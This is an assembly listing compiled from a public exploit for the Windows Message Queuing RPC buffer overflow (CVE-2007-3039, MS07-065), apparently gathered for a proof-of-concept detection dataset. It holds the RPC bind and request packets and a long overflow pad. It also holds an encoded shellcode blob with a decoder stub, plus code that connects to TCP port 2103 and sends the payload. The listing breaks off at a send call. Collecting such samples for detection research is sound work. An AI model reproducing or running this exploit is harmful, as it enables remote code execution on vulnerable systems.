; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

	TITLE	C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_4934_cve_id_CVE-2007-3039.obj
	.686P
	.XMM
	include listing.inc
	.model	flat

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	_bind_str
PUBLIC	_request_1a
PUBLIC	_request_1c
PUBLIC	_request_2
_DATA	SEGMENT
COMM	_request_1:DWORD
COMM	_request_1b:DWORD
_DATA	ENDS
_DATA	SEGMENT
_bind_str DB	05H
	DB	00H
	DB	0bH
	DB	03H
	DB	010H
	DB	00H
	DB	00H
	DB	00H
	DB	048H
	DB	00H
	DB	00H
	DB	00H
	DB	01H
	DB	00H
	DB	00H
	DB	00H
	DB	0d0H
	DB	016H
	DB	0d0H
	DB	016H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	01H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	01H
	DB	00H
	DB	030H
	DB	0a0H
	DB	0b3H
	DB	0fdH
	DB	05fH
	DB	06H
	DB	0d1H
	DB	011H
	DB	0bbH
	DB	09bH
	DB	00H
	DB	0a0H
	DB	024H
	DB	0eaH
	DB	055H
	DB	025H
	DB	01H
	DB	00H
	DB	00H
	DB	00H
	DB	04H
	DB	05dH
	DB	088H
	DB	08aH
	DB	0ebH
	DB	01cH
	DB	0c9H
	DB	011H
	DB	09fH
	DB	0e8H
	DB	08H
	DB	00H
	DB	02bH
	DB	010H
	DB	048H
	DB	060H
	DB	02H
	DB	00H
	DB	00H
	DB	00H
_request_1a DB	05H
	DB	00H
	DB	00H
	DB	081H
	DB	010H
	DB	00H
	DB	00H
	DB	00H
	DB	0d0H
	DB	016H
	DB	00H
	DB	00H
	DB	01H
	DB	00H
	DB	00H
	DB	00H
	DB	098H
	DB	017H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	06H
	DB	00H
	DB	030H
	DB	0a0H
	DB	0b3H
	DB	0fdH
	DB	05fH
	DB	06H
	DB	0d1H
	DB	011H
	DB	0bbH
	DB	09bH
	DB	00H
	DB	0a0H
	DB	024H
	DB	0eaH
	DB	055H
	DB	025H
	DB	01H
	DB	00H
	DB	00H
	DB	00H
	DB	0baH
	DB	0bH
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	0baH
	DB	0bH
	DB	00H
	DB	00H
_request_1c DB	05cH
	DB	00H
	DB	00H
	DB	0ccH
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	0ebH
	DB	06H
	DB	042H
	DB	042H
	DB	032H
	DB	0b0H
	DB	01H
	DB	078H
	DB	02bH
	DB	0c9H
	DB	083H
	DB	0e9H
	DB	0b0H
	DB	0d9H
	DB	0eeH
	DB	0d9H
	DB	074H
	DB	024H
	DB	0f4H
	DB	05bH
	DB	081H
	DB	073H
	DB	013H
	DB	01dH
	DB	082H
	DB	067H
	DB	0b4H
	DB	083H
	DB	0ebH
	DB	0fcH
	DB	0e2H
	DB	0f4H
	DB	0e1H
	DB	0e8H
	DB	08cH
	DB	0f9H
	DB	0f5H
	DB	07bH
	DB	098H
	DB	04bH
	DB	0e2H
	DB	0e2H
	DB	0ecH
	DB	0d8H
	DB	039H
	DB	0a6H
	DB	0ecH
	DB	0f1H
	DB	021H
	DB	09H
	DB	01bH
	DB	0b1H
	DB	065H
	DB	083H
	DB	088H
	DB	03fH
	DB	052H
	DB	09aH
	DB	0ecH
	DB	0ebH
	DB	03dH
	DB	083H
	DB	08cH
	DB	0fdH
	DB	096H
	DB	0b6H
	DB	0ecH
	DB	0b5H
	DB	0f3H
	DB	0b3H
	DB	0a7H
	DB	02dH
	DB	0b1H
	DB	06H
	DB	0a7H
	DB	0c0H
	DB	01aH
	DB	043H
	DB	0adH
	DB	0b9H
	DB	01cH
	DB	040H
	DB	08cH
	DB	040H
	DB	026H
	DB	0d6H
	DB	043H
	DB	09cH
	DB	068H
	DB	067H
	DB	0ecH
	DB	0ebH
	DB	039H
	DB	083H
	DB	08cH
	DB	0d2H
	DB	096H
	DB	08eH
	DB	02cH
	DB	03fH
	DB	042H
	DB	09eH
	DB	066H
	DB	05fH
	DB	01eH
	DB	0aeH
	DB	0ecH
	DB	03dH
	DB	071H
	DB	0a6H
	DB	07bH
	DB	0d5H
	DB	0deH
	DB	0b3H
	DB	0bcH
	DB	0d0H
	DB	096H
	DB	0c1H
	DB	057H
	DB	03fH
	DB	05dH
	DB	08eH
	DB	0ecH
	DB	0c4H
	DB	01H
	DB	02fH
	DB	0ecH
	DB	0f4H
	DB	015H
	DB	0dcH
	DB	0fH
	DB	03aH
	DB	053H
	DB	08cH
	DB	08bH
	DB	0e4H
	DB	0e2H
	DB	054H
	DB	01H
	DB	0e7H
	DB	07bH
	DB	0eaH
	DB	054H
	DB	086H
	DB	075H
	DB	0f5H
	DB	014H
	DB	086H
	DB	042H
	DB	0d6H
	DB	098H
	DB	064H
	DB	075H
	DB	049H
	DB	08aH
	DB	048H
	DB	026H
	DB	0d2H
	DB	098H
	DB	062H
	DB	042H
	DB	0bH
	DB	082H
	DB	0d2H
	DB	09cH
	DB	06fH
	DB	06fH
	DB	0b6H
	DB	048H
	DB	0e8H
	DB	065H
	DB	04bH
	DB	0cdH
	DB	0eaH
	DB	0beH
	DB	0bdH
	DB	0e8H
	DB	02fH
	DB	030H
	DB	04bH
	DB	0cbH
	DB	0d1H
	DB	034H
	DB	0e7H
	DB	04eH
	DB	0d1H
	DB	024H
	DB	0e7H
	DB	05eH
	DB	0d1H
	DB	098H
	DB	064H
	DB	07bH
	DB	0eaH
	DB	063H
	DB	036H
	DB	07bH
	DB	0d1H
	DB	0eeH
	DB	055H
	DB	088H
	DB	0eaH
	DB	0c3H
	DB	0aeH
	DB	06dH
	DB	045H
	DB	030H
	DB	04bH
	DB	0cbH
	DB	0e8H
	DB	077H
	DB	0e5H
	DB	048H
	DB	07dH
	DB	0b7H
	DB	0dcH
	DB	0b9H
	DB	02fH
	DB	049H
	DB	05dH
	DB	04aH
	DB	07dH
	DB	0b1H
	DB	0e7H
	DB	048H
	DB	07dH
	DB	0b7H
	DB	0dcH
	DB	0f8H
	DB	0cbH
	DB	0e1H
	DB	0fdH
	DB	04aH
	DB	07dH
	DB	0b1H
	DB	0e4H
	DB	049H
	DB	0d6H
	DB	032H
	DB	04bH
	DB	0cdH
	DB	011H
	DB	0fH
	DB	053H
	DB	064H
	DB	044H
	DB	01eH
	DB	0e3H
	DB	0e2H
	DB	054H
	DB	032H
	DB	04bH
	DB	0cdH
	DB	0e4H
	DB	0dH
	DB	0d0H
	DB	07bH
	DB	0eaH
	DB	04H
	DB	0d9H
	DB	094H
	DB	067H
	DB	0dH
	DB	0e4H
	DB	044H
	DB	0abH
	DB	0abH
	DB	03dH
	DB	0faH
	DB	0e8H
	DB	023H
	DB	03dH
	DB	0ffH
	DB	0b3H
	DB	0a7H
	DB	047H
	DB	0b7H
	DB	07cH
	DB	025H
	DB	099H
	DB	0e3H
	DB	0c0H
	DB	04bH
	DB	027H
	DB	090H
	DB	0f8H
	DB	05fH
	DB	01fH
	DB	0b6H
	DB	029H
	DB	0fH
	DB	0c6H
	DB	0e3H
	DB	031H
	DB	071H
	DB	04bH
	DB	068H
	DB	0c6H
	DB	098H
	DB	062H
	DB	046H
	DB	0d5H
	DB	035H
	DB	0e5H
	DB	04cH
	DB	0d3H
	DB	0dH
	DB	0b5H
	DB	04cH
	DB	0d3H
	DB	032H
	DB	0e5H
	DB	0e2H
	DB	052H
	DB	0fH
	DB	019H
	DB	0c4H
	DB	087H
	DB	0a9H
	DB	0e7H
	DB	0e2H
	DB	054H
	DB	0dH
	DB	04bH
	DB	0e2H
	DB	0b5H
	DB	098H
	DB	064H
	DB	096H
	DB	0d5H
	DB	09bH
	DB	037H
	DB	0d9H
	DB	0e6H
	DB	098H
	DB	062H
	DB	04fH
	DB	07dH
	DB	0b7H
	DB	0dcH
	DB	0f2H
	DB	04cH
	DB	087H
	DB	0d4H
	DB	04eH
	DB	07dH
	DB	0b1H
	DB	04bH
	DB	0cdH
	DB	082H
	DB	067H
	DB	0b4H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
_request_2 DB	05H
	DB	00H
	DB	00H
	DB	082H
	DB	010H
	DB	00H
	DB	00H
	DB	00H
	DB	018H
	DB	01H
	DB	00H
	DB	00H
	DB	01H
	DB	00H
	DB	00H
	DB	00H
	DB	0f0H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	06H
	DB	00H
	DB	030H
	DB	0a0H
	DB	0b3H
	DB	0fdH
	DB	05fH
	DB	06H
	DB	0d1H
	DB	011H
	DB	0bbH
	DB	09bH
	DB	00H
	DB	0a0H
	DB	024H
	DB	0eaH
	DB	055H
	DB	025H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	041H
	DB	01H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
	DB	00H
_DATA	ENDS
PUBLIC	___local_stdio_printf_options
PUBLIC	__vfprintf_l
PUBLIC	_fprintf
PUBLIC	_printf
PUBLIC	_usage
PUBLIC	_Disconnect
PUBLIC	_Make_Connection
PUBLIC	_main
EXTRN	___acrt_iob_func:PROC
EXTRN	___stdio_common_vfprintf:PROC
EXTRN	_calloc:PROC
EXTRN	_malloc:PROC
EXTRN	_exit:PROC
EXTRN	_atoi:PROC
EXTRN	_memcpy:PROC
EXTRN	_memset:PROC
EXTRN	_strcmp:PROC
EXTRN	_strcpy:PROC
EXTRN	_strlen:PROC
EXTRN	__imp__Sleep@4:PROC
EXTRN	_closesocket@4:PROC
EXTRN	_connect@12:PROC
EXTRN	_ioctlsocket@12:PROC
EXTRN	_getsockopt@20:PROC
EXTRN	_htons@4:PROC
EXTRN	_inet_addr@4:PROC
EXTRN	_recv@16:PROC
EXTRN	_select@20:PROC
EXTRN	_send@16:PROC
EXTRN	_socket@12:PROC
EXTRN	_WSAStartup@8:PROC
EXTRN	_WSACleanup@0:PROC
EXTRN	@__security_check_cookie@4:PROC
EXTRN	__chkstk:PROC
EXTRN	_memset:PROC
EXTRN	___security_cookie:DWORD
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
_DATA	SEGMENT
$SG98632 DB	' Usage:   %s -h 127.0.0.1 (Universal exploit)', 0aH, 00H
	ORG $+1
$SG98633 DB	'          %s -h host -n dnsname [-p port]', 0aH, 00H
	ORG $+5
$SG98717 DB	'--------------------------------------------------------'
	DB	'------------------', 0aH, 00H
	ORG $+4
$SG98718 DB	'-== Windows Message Queuing Service RPC BOF Exploit (MS0'
	DB	'7-065) - MK mod ==-', 0aH, 00H
	ORG $+3
$SG98719 DB	'-== code by axis@ph4nt0m ==-', 0aH, 00H
	ORG $+2
$SG98720 DB	'-== Http://www.ph4nt0m.org ==-', 0aH, 00H
$SG98721 DB	'-== Tested against Windows 2000 server SP4 ==-', 0aH, 00H
$SG98722 DB	'--------------------------------------------------------'
	DB	'------------------', 0aH, 0aH, 00H
	ORG $+3
$SG98730 DB	'2103', 00H
	ORG $+3
$SG98731 DB	'[+] Attacking default port 2103', 0aH, 00H
	ORG $+3
$SG98734 DB	'[-] Invalid argument: %s', 0aH, 00H
	ORG $+2
$SG98736 DB	'Allocation Error', 0aH, 00H
	ORG $+2
$SG98740 DB	'[-] WSAStartup failed.', 0aH, 00H
$SG98742 DB	'[-] connect err.', 0aH, 00H
	ORG $+2
$SG98743 DB	'[*]Sending our Payload, Good Luck! ^_^', 0aH, 00H
$SG98744 DB	'[*]Sending RPC Bind String!', 0aH, 00H
	ORG $+3
$SG98745 DB	'[*]Sending RPC Request Now!', 0aH, 00H
	ORG $+3
$SG98747 DB	'Allocation Error', 0aH, 00H
_DATA	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_ret$ = -6440						; size = 4
_len$ = -6436						; size = 4
_target$ = -6432					; size = 4
_port$ = -6428						; size = 4
tv90 = -6424						; size = 4
_j$ = -6420						; size = 4
_s$ = -6416						; size = 4
_name$ = -6412						; size = 4
_i$ = -6408						; size = 4
_WSAData$ = -6404					; size = 400
_buffer$ = -6004					; size = 6000
__$ArrayPad$ = -4					; size = 4
_argc$ = 8						; size = 4
_argv$ = 12						; size = 4
_main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\all_exploits\os_based\exp_db_4934_cve_id_CVE-2007-3039.c
; Line 262
	push	ebp
	mov	ebp, esp
	mov	eax, 6440				; 00001928H
	call	__chkstk
	mov	eax, DWORD PTR ___security_cookie
	xor	eax, ebp
	mov	DWORD PTR __$ArrayPad$[ebp], eax
; Line 264
	mov	DWORD PTR _target$[ebp], 0
; Line 265
	mov	DWORD PTR _name$[ebp], 0
; Line 266
	mov	DWORD PTR _port$[ebp], 2103		; 00000837H
; Line 271
	push	6000					; 00001770H
	push	0
	lea	eax, DWORD PTR _buffer$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 275
	push	OFFSET $SG98717
	call	_printf
	add	esp, 4
; Line 276
	push	OFFSET $SG98718
	call	_printf
	add	esp, 4
; Line 277
	push	OFFSET $SG98719
	call	_printf
	add	esp, 4
; Line 278
	push	OFFSET $SG98720
	call	_printf
	add	esp, 4
; Line 279
	push	OFFSET $SG98721
	call	_printf
	add	esp, 4
; Line 281
	push	OFFSET $SG98722
	call	_printf
	add	esp, 4
; Line 283
	cmp	DWORD PTR _argc$[ebp], 5
	jge	SHORT $LN10@main
; Line 284
	mov	ecx, 4
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	call	_usage
	add	esp, 4
$LN10@main:
; Line 285
	mov	DWORD PTR _i$[ebp], 1
	jmp	SHORT $LN4@main
$LN2@main:
	mov	edx, DWORD PTR _i$[ebp]
	add	edx, 1
	mov	DWORD PTR _i$[ebp], edx
$LN4@main:
	mov	eax, DWORD PTR _i$[ebp]
	cmp	eax, DWORD PTR _argc$[ebp]
	jge	$LN3@main
; Line 287
	mov	ecx, 1
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _i$[ebp]
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [ecx+eax*4]
	movsx	ecx, BYTE PTR [eax+edx]
	cmp	ecx, 45					; 0000002dH
	jne	$LN11@main
; Line 289
	mov	edx, 1
	shl	edx, 0
	mov	eax, DWORD PTR _i$[ebp]
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	eax, DWORD PTR [ecx+eax*4]
	mov	cl, BYTE PTR [edx+eax]
	mov	BYTE PTR tv90[ebp], cl
	cmp	BYTE PTR tv90[ebp], 104			; 00000068H
	je	SHORT $LN13@main
	cmp	BYTE PTR tv90[ebp], 110			; 0000006eH
	je	SHORT $LN17@main
	cmp	BYTE PTR tv90[ebp], 112			; 00000070H
	je	SHORT $LN14@main
	jmp	SHORT $LN18@main
$LN13@main:
; Line 292
	mov	edx, DWORD PTR _i$[ebp]
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx*4+4]
	mov	DWORD PTR _target$[ebp], ecx
; Line 293
	jmp	$LN5@main
$LN14@main:
; Line 295
	push	OFFSET $SG98730
	mov	edx, DWORD PTR _i$[ebp]
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx*4+4]
	push	ecx
	call	_strcmp
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN15@main
; Line 297
	push	OFFSET $SG98731
	call	_printf
	add	esp, 4
; Line 298
	jmp	SHORT $LN16@main
$LN15@main:
; Line 301
	mov	edx, DWORD PTR _i$[ebp]
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx*4+4]
	push	ecx
	call	_atoi
	add	esp, 4
	mov	DWORD PTR _port$[ebp], eax
$LN16@main:
; Line 303
	jmp	SHORT $LN5@main
$LN17@main:
; Line 305
	mov	edx, DWORD PTR _i$[ebp]
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx*4+4]
	mov	DWORD PTR _name$[ebp], ecx
; Line 306
	jmp	SHORT $LN5@main
$LN18@main:
; Line 308
	mov	edx, DWORD PTR _i$[ebp]
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx*4]
	push	ecx
	push	OFFSET $SG98734
	call	_printf
	add	esp, 8
; Line 309
	mov	edx, 4
	imul	eax, edx, 0
	mov	ecx, DWORD PTR _argv$[ebp]
	mov	edx, DWORD PTR [ecx+eax]
	push	edx
	call	_usage
	add	esp, 4
$LN5@main:
; Line 312
	mov	eax, DWORD PTR _i$[ebp]
	add	eax, 1
	mov	DWORD PTR _i$[ebp], eax
; Line 313
	jmp	SHORT $LN12@main
$LN11@main:
; Line 315
	mov	ecx, 4
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _argv$[ebp]
	mov	ecx, DWORD PTR [eax+edx]
	push	ecx
	call	_usage
	add	esp, 4
$LN12@main:
; Line 316
	jmp	$LN2@main
$LN3@main:
; Line 319
	mov	edx, DWORD PTR _name$[ebp]
	push	edx
	call	_strlen
	add	esp, 4
	shl	eax, 1
	push	eax
	call	_malloc
	add	esp, 4
	mov	DWORD PTR _request_1b, eax
; Line 321
	cmp	DWORD PTR _request_1b, 0
	jne	SHORT $LN19@main
; Line 323
	push	OFFSET $SG98736
	call	_printf
	add	esp, 4
; Line 324
	push	1
	call	_exit
$LN19@main:
; Line 328
	mov	eax, DWORD PTR _name$[ebp]
	push	eax
	mov	ecx, DWORD PTR _request_1b
	push	ecx
	call	_strcpy
	add	esp, 8
; Line 331
	mov	DWORD PTR _i$[ebp], 0
	mov	DWORD PTR _j$[ebp], 0
	jmp	SHORT $LN9@main
$LN7@main:
	mov	edx, DWORD PTR _j$[ebp]
	add	edx, 1
	mov	DWORD PTR _j$[ebp], edx
$LN9@main:
	mov	eax, DWORD PTR _name$[ebp]
	push	eax
	call	_strlen
	add	esp, 4
	shl	eax, 1
	cmp	DWORD PTR _j$[ebp], eax
	jae	SHORT $LN8@main
; Line 333
	mov	ecx, DWORD PTR _j$[ebp]
	and	ecx, -2147483647			; 80000001H
	jns	SHORT $LN26@main
	dec	ecx
	or	ecx, -2					; fffffffeH
	inc	ecx
$LN26@main:
	test	ecx, ecx
	jne	SHORT $LN20@main
; Line 335
	mov	edx, DWORD PTR _request_1b
	add	edx, DWORD PTR _j$[ebp]
	mov	eax, DWORD PTR _name$[ebp]
	add	eax, DWORD PTR _i$[ebp]
	mov	cl, BYTE PTR [eax]
	mov	BYTE PTR [edx], cl
; Line 336
	jmp	SHORT $LN21@main
$LN20@main:
; Line 339
	mov	edx, DWORD PTR _request_1b
	add	edx, DWORD PTR _j$[ebp]
	mov	BYTE PTR [edx], 0
; Line 340
	mov	eax, DWORD PTR _i$[ebp]
	add	eax, 1
	mov	DWORD PTR _i$[ebp], eax
$LN21@main:
; Line 342
	jmp	SHORT $LN7@main
$LN8@main:
; Line 349
	lea	ecx, DWORD PTR _WSAData$[ebp]
	push	ecx
	push	257					; 00000101H
	call	_WSAStartup@8
	test	eax, eax
	je	SHORT $LN22@main
; Line 351
	push	OFFSET $SG98740
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 352
	call	_WSACleanup@0
; Line 353
	push	1
	call	_exit
$LN22@main:
; Line 357
	push	1200					; 000004b0H
	call	DWORD PTR __imp__Sleep@4
; Line 360
	push	10					; 0000000aH
	mov	edx, DWORD PTR _port$[ebp]
	push	edx
	mov	eax, DWORD PTR _target$[ebp]
	push	eax
	call	_Make_Connection
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _s$[ebp], eax
; Line 361
	cmp	DWORD PTR _s$[ebp], 0
	jae	SHORT $LN23@main
; Line 363
	push	OFFSET $SG98742
	push	2
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	_fprintf
	add	esp, 8
; Line 364
	push	1
	call	_exit
$LN23@main:
; Line 368
	push	OFFSET $SG98743
	call	_printf
	add	esp, 4
; Line 370
	push	OFFSET $SG98744
	call	_printf
	add	esp, 4
; Line 372
	push	0
	push	72					; 00000048H
	push	OFFSET _bind_str
	mov	ecx, DWORD PTR _s$[ebp]
	push	ecx
	call	_send@16
; Line 375
	push	1000					; 000003e8H
	call	DWORD PTR __imp__Sleep@4
; Line 377
	push	OFFSET $SG98745
	call	_printf
	add	esp, 4
; Line 379
	mov	edx, DWORD PTR _name$[ebp]
	push	edx
	call	_strlen
	add	esp, 4
	lea	eax, DWORD PTR [eax+eax+696]
	mov	DWORD PTR _len$[ebp], eax
; Line 381
	push	1
	mov	ecx, DWORD PTR _len$[ebp]
	push	ecx
	call	_calloc
	add	esp, 8
	mov	DWORD PTR _request_1, eax
; Line 383
	cmp	DWORD PTR _request_1, 0
	jne	SHORT $LN24@main
; Line 385
	push	OFFSET $SG98747
	call	_printf
	add	esp, 4
; Line 386
	push	1
	call	_exit
$LN24@main:
; Line 389
	push	56					; 00000038H
	push	OFFSET _request_1a
	mov	edx, DWORD PTR _request_1
	push	edx
	call	_memcpy
	add	esp, 12					; 0000000cH
; Line 390
	mov	eax, DWORD PTR _name$[ebp]
	push	eax
	call	_strlen
	add	esp, 4
	shl	eax, 1
	push	eax
	mov	ecx, DWORD PTR _request_1b
	push	ecx
	mov	edx, DWORD PTR _request_1
	add	edx, 56					; 00000038H
	push	edx
	call	_memcpy
	add	esp, 12					; 0000000cH
; Line 391
	push	640					; 00000280H
	push	OFFSET _request_1c
	mov	eax, DWORD PTR _name$[ebp]
	push	eax
	call	_strlen
	add	esp, 4
	mov	ecx, DWORD PTR _request_1
	lea	edx, DWORD PTR [ecx+eax*2+56]
	push	edx
	call	_memcpy
	add	esp, 12					; 0000000cH
; Line 394
	push	1
	call	_exit
; Line 396
	push	6000					; 00001770H
	push	65					; 00000041H
	lea	eax, DWORD PTR _buffer$[ebp]
	push	eax
	call	_memset
	add	esp, 12					; 0000000cH
; Line 397
	push	0
	push	4
	mov	ecx, DWORD PTR _request_1
	push	ecx
	mov	edx, DWORD PTR _s$[ebp]
	push	edx
	call	_send@16
; Line 398
	push	0
	push	5104					; 000013f0H
	lea	eax, DWORD PTR _buffer$[ebp]
	push	eax
	mov	ecx, DWORD PTR _s$[ebp]
	push	ecx
	call	_send@16
; Line 399
	push	0
	push	280					; 00000118H
	push	OFFSET _request_2
